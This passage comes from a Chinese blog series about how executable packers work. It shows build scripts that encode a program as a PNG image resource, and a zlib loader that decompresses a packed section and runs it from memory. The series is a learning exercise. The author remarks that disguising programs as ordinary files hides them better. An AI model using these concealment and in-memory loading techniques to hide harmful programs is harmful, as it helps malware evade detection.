&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">ROW_LEN&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">t&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">ROW_LEN&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">ROW_LEN&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">ROW_LEN&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">arr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">png&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;L&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMG_PATH&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>非常简单的一段脚本。把内容长度和内容拼接后，以 &lt;code>ROW_LEN&lt;/code> 每行，拆成一个二维数组，然后用 pypng 编码并保存。&lt;/p>
&lt;h3 id="32-编译资源">3.2 编译资源&lt;/h3>
&lt;p>随便新建一个 &lt;code>rsrc.rc&lt;/code> 。&lt;/p>
&lt;p>别问 &lt;code>.rc&lt;/code> 怎么写，不知道，问就是面向谷歌编程抄的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">beautiful.png RCDATA &amp;#34;packer5-packed.png&amp;#34;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在脚本里调用 &lt;code>windres&lt;/code> 编译。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">windres&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">executable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;windres&amp;#39;&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">sources&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">list&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">tuple&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">executable&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1"> -o &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stderr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">STDOUT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="n">CompilationError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">windres&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">src_dir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rsrc.rc&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">src_dir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rsrc.o&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>就得到了 &lt;code>rsrc.o&lt;/code> 。&lt;/p>
&lt;h3 id="33-编译加载器">3.3 编译加载器&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># compile shifted loader program&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">compile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;span class="n">compiler&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;gcc&amp;#39;&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">sources&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">list&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">tuple&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sources&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">flags&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">list&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">tuple&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">compiler&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stderr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">STDOUT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="n">CompilationError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">cflags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;-m32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-O2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wall&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-I.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wl,--entry=__start&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nodefaultlibs&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nostartfiles&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-lkernel32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-luser32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-lmsvcrt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-lpng&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-o&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;packed.exe&amp;#39;&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="nb">compile&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">src_dir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">src&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;loader.c&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;png_decode.c&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rsrc.o&amp;#39;&lt;/span>&lt;span class="p">]],&lt;/span> &lt;span class="n">cflags&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] compile loader with resource success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>主要是加上 &lt;code>-lpng&lt;/code> 链接参数，链接 &lt;code>libpng&lt;/code> 。输入文件里加上 &lt;code>png_decode.c&lt;/code> 这个里面实现了 &lt;code>read_program_from_png&lt;/code>，还有编译好的资源 &lt;code>rsrc.o&lt;/code>。&lt;/p>
&lt;h2 id="0x04-成果展示">0x04 成果展示&lt;/h2>
&lt;h3 id="41-完整代码">4.1 完整代码&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/nnnewb/learning-packer/tree/main/packer5" target="_blank" rel="noopener"
>github.com - packer05&lt;/a>&lt;/p>
&lt;h3 id="42-成果">4.2 成果&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-05/png-packer.gif"
width="934"
height="624"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-05/png-packer_hu49467b8d76a283ecefa4b0c8c018eaea_352500_480x0_resize_box.gif 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-05/png-packer_hu49467b8d76a283ecefa4b0c8c018eaea_352500_1024x0_resize_box.gif 1024w"
loading="lazy"
alt="png-packer"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="359px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172402101.png"
width="1123"
height="262"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172402101_hu5e82684139999b9b3beada7e64c4352c_121826_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172402101_hu5e82684139999b9b3beada7e64c4352c_121826_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211021172402101"
class="gallery-image"
data-flex-grow="428"
data-flex-basis="1028px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172445654.png"
width="745"
height="442"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172445654_huadd050e73542001f453da1b3213f5950_43748_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172445654_huadd050e73542001f453da1b3213f5950_43748_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211021172445654"
class="gallery-image"
data-flex-grow="168"
data-flex-basis="404px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172504888.png"
width="969"
height="550"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172504888_hubda3186aaf1f68e7da983b4009bb0f3d_50213_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-05/image-20211021172504888_hubda3186aaf1f68e7da983b4009bb0f3d_50213_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211021172504888"
class="gallery-image"
data-flex-grow="176"
data-flex-basis="422px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这次实验主要是验证了从资源加载程序，本质和之前的其他加壳方式没有区别。把应用程序转换成图片后看到的效果确实比较有趣，我想如果用一张普通的图片或者其他文件类型，藏起来可能更隐蔽。&lt;/p>
&lt;p>但到这里还是有明显的问题：壳和被加载的程序还是泾渭分明。&lt;/p></description></item><item><title>加壳原理04 - zlib压缩壳案例</title><link>https://nnnewb.github.io/blog/p/learning-packer-04-zlib-compression-packer-demo/</link><pubDate>Wed, 20 Oct 2021 16:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-04-zlib-compression-packer-demo/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-04-zlib-compression-packer-demo/cover.jpg" alt="Featured image of post 加壳原理04 - zlib压缩壳案例" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>本文在前一篇基础上，写一个使用 zlib 的压缩壳案例。&lt;/p>
&lt;h2 id="0x01-zlib-解压">0x01 zlib 解压&lt;/h2>
&lt;h3 id="11-概述">1.1 概述&lt;/h3>
&lt;p>关于 zlib 的用法找了这些参考资料：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://zlib.net/zpipe.c" target="_blank" rel="noopener"
>zlib.net/zpipe.c&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://zlib.net/zlib_how.html" target="_blank" rel="noopener"
>zlib Usage Example&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://gist.github.com/arq5x/5315739" target="_blank" rel="noopener"
>Compress and Decompress a string with zlib&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>尝试了 zlib、lzo、Windows Compression API，对压缩和解压 API 的基本模式的基本认识大概是这样：&lt;/p>
&lt;ul>
&lt;li>首先，你得有被压缩数据的大小（要么分块压缩，要么有整个压缩后的大小）&lt;/li>
&lt;li>然后得有解压后的预期大小，这个能通过 &lt;em>尝试解压&lt;/em> 的操作来实现。比如 Windows Compression API 和 lzo 都可以在解压 buffer 传 NULL，尝试取得解压后的大小，再分配好内存解压。&lt;/li>
&lt;li>zlib 这样的流式压缩、解压处理文件比较友好，但全程在内存里进行的话，流式解压就会导致大量内存分配 =。= 除非一开始就分配足够的空间，不然一个一个内存块申请和合并会很蛋疼。&lt;/li>
&lt;/ul>
&lt;h3 id="12-内存布局">1.2 内存布局&lt;/h3>
&lt;p>压缩后的 &lt;code>.packed&lt;/code> 节在头部留出 8 个字节，分别保存压缩后大小和压缩前大小，以便一次分配好内存完成解压。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>偏移&lt;/th>
&lt;th>大小&lt;/th>
&lt;th>内容&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>DWORD&lt;/td>
&lt;td>小端序，压缩后大小&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>DWORD&lt;/td>
&lt;td>小端序，压缩前大小&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>8&lt;/td>
&lt;td>可变&lt;/td>
&lt;td>压缩后的数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="13-解压代码">1.3 解压代码&lt;/h3>
&lt;p>解压过程在加载 PE 之前，找到 &lt;code>.packed&lt;/code> 节后，开始读取头部大小，并调用解压代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">packed&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">compressed_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">packed&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// compressed size little-endian
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">decompressed_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">packed&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">));&lt;/span> &lt;span class="c1">// decompressed size little-endian
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">compressed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">packed&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// compressed buffer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">decompressed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">decompressed_size&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// decompressed buffer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">decompressed&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;memory allocate failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;malloc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">decompress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">compressed&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">compressed_size&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">decompressed&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">decompressed_size&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">decompressed&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>应该没有太多疑问。接下来的是解压代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">decompress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">compressed&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">decompressed&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">decompressed_length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">z_stream&lt;/span> &lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">zalloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Z_NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">zfree&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Z_NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">opaque&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Z_NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">avail_in&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uInt&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next_in&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Bytef&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">compressed&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">avail_out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uInt&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">decompressed_length&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next_out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Bytef&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">decompressed&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inflateInit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">err&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">inflate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Z_NO_FLUSH&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">Z_STREAM_END&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">inflateEnd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;zlib decompression failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;zlib&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">inflateEnd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">inflate_stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
